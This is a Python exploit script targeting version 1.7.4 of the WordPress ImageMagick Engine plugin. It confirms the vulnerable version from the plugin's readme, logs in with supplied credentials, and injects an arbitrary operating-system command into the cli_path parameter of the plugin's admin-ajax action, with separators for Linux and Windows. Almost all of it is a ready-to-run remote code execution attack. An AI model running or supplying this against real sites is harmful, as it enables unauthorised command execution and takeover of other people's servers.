#!/usr/bin/ python

from pwn import *
from sys import exit, argv
import requests
import subprocess
import argparse
import urllib.parse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", dest="domain", help="Domain URL Address.")
    parser.add_argument("-u", "--username", dest="username", help="Login Username.")
    parser.add_argument("-p", "--password", dest="password", help="Login Password.")
    parser.add_argument("-c", "--command", dest="command", help="""
    CLI Commands:
        -- payload on windows: d&calc.exe&anything
        -- on unix : notify-send 'done'
    """)
    options = parser.parse_args()
    return options


class Exploit:
    def __init__(self, url, username, password, rce_command):
        self.session = None
        self.url = url
        self.username = username
        self.password = password
        self.rce_command = rce_command
        self.p = log.progress("checking")

    def check_version(self):
        r = requests.get(self.url+"/wp-content/plugins/imagemagick-engine/readme.txt")
        if "1.7.5" in r.text:
            self.p = log.warn("not vulnerable")
            exit(0)
        elif "Stable tag: 1.7.4" in r.text:
            self.p = log.progress("vulnerable to rce")

    def login(self):
        self.session = requests.Session()
        login_url = self.url + "/wp-login.php"
        login_data = {
            "log": {self.username},
            "pwd": {self.password},
        }
        try:
            login_session = self.session.post(login_url, data=login_data)
            if "Error:" in login_session.text:
                self.p = log.warn("login failed!")
                exit(0)
            if "Error:" not in login_session.text:
                self.p = log.progress("Successfully logged in")

        except KeyboardInterrupt:
            log.success("Exiting..")

    def rce_exploit(self):
        try:
            self.p = log.progress("getting into shell")
            rce_command = urllib.parse.quote(self.rce_command)
            commands_for_linux = f"cli_path=d%3B{rce_command}%3Bwhoami"
            commands_for_windows = f"cli_path=d%26{self.rce_command}%26whoami"
            vuln_url = f"/wp-admin/admin-ajax.php?action=ime_test_im_path&{commands_for_linux}"
            rce_payload = self.url + vuln_url
            self.session.get(rce_payload)

        except KeyboardInterrupt:
            log.success("Exiting..")


if __name__ == "__main__":
    options = get_arguments()

    url_ip = options.domain
    wordpress_username = options.username
    wordpress_password = options.password
    rce_command = options.command
    exploit = Exploit(url_ip, wordpress_username, wordpress_password, rce_command)

    exploit.check_version()
    exploit.login()
    exploit.rce_exploit()
    
